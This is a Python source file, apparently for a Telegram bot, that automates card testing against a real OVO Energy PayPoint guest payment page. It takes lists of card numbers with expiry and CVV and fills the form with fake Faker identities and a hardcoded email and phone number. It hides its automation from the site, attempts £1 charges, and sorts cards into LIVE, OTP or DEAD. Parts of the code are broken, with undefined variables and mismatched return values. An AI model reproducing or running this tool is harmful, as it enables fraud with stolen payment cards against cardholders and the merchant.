from playwright.async_api import async_playwright
import asyncio
import faker as faker_module
import uuid
import os
from aiogram.types import FSInputFile


faker = faker_module.Faker("en_GB")

async def run_ovocharger(card_details: str, user_id: str):
    cardnumber, expirymonth, expiryyear, cvv = card_details.split('|')

    # unique profile dir per run to prevent concurrency issues
    user_data_dir = f"/tmp/playwright-profile-{uuid.uuid4().hex}"

    async with async_playwright() as p:
        browser = await p.chromium.launch_persistent_context(
            user_data_dir=user_data_dir,
            headless=True,
            args=["--no-sandbox"]
        )
        page = await browser.new_page()
        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

        try:
            await page.goto("https://ovoenergypayments.paypoint.com/GuestPayment", timeout=60000)

            # Fake details
            name = faker.name()
            address1 = faker.street_address()
            city = faker.city()
            postcode = faker.postcode()

            ovo_id = await get_ovo_id(user_id)
            if not ovo_id:
                await browser.close()
                return None, "NO_OVO_ID"

            await page.fill('#customerid', ovo_id)
            await page.fill('#amount', '1')
            await page.fill('#cardholdername', name)

            frame_element = await page.wait_for_selector('iframe[src*="hostedfields.paypoint.services"]', timeout=10000)
            frame = await frame_element.content_frame()
            await frame.fill('input[name="card_number"]', cardnumber)

            await page.select_option('select[name="PaymentCard.ExpiryMonth"]', expirymonth)
            await page.select_option('select[name="PaymentCard.ExpiryYear"]', expiryyear)
            await page.fill('input[name="PaymentCard.CVV"]', cvv)

            await page.fill('#postcode', postcode)
            await page.fill('#address1', address1)
            await page.fill('#city', city)
            await page.fill('#emailForConfirmation', 'maxxxier@yahoo.com')
            await page.fill('#mobileNumberForSmsConfirmation', '07454805800')
            await page.check('input[name="AcceptedTermsAndConditions"]')

            # Click Make Payment button with retries
            button_locator = page.locator('input#makePayment')
            for attempt in range(3):
                if await button_locator.is_visible():
                    await button_locator.click(force=True)
                    await page.wait_for_timeout(2000)
                else:
                    break

            await page.wait_for_timeout(15000)

            # Detect payment status
            status = "UNKNOWN"
            for frm in page.frames:
                try:
                    content = await frm.content()
                    text = content.lower()
                    if "payment authorised" in text:
                        status = "LIVE"
                        break
                    elif any(w in text for w in ["verify", "otp", "authorise", "mobile app"]):
                        status = "OTP"
                        break
                    elif "declined" in text:
                        status = "DEAD"
                        break
                except:
                    continue

            if screenshot_path and os.path.exists(screenshot_path):
                screenshot_file = FSInputFile(screenshot_path)
                await message.answer_photo(screenshot_file, caption=f"Status: {status}")
            else:
                await message.answer(f"Status: {status}")

        except Exception as e:
            print(f"Error in run_ovocharger: {e}")
            status = "ERROR"
        finally:
            await browser.close()

async def process_multiple_cards(cards: list[str], user_id: str):
    tasks = [run_ovocharger(card, user_id) for card in cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results


# Example
if __name__ == "__main__":
    test_cards = [
        "1234567812345678|12|25|123",
        "8765432187654321|01|24|321",
    ]
    user_id = "42"

    results = asyncio.run(process_multiple_cards(test_cards, user_id))
    for idx, (screenshot, status) in enumerate(results):
        print(f"Card {idx+1}: {status}, Screenshot: {screenshot}")



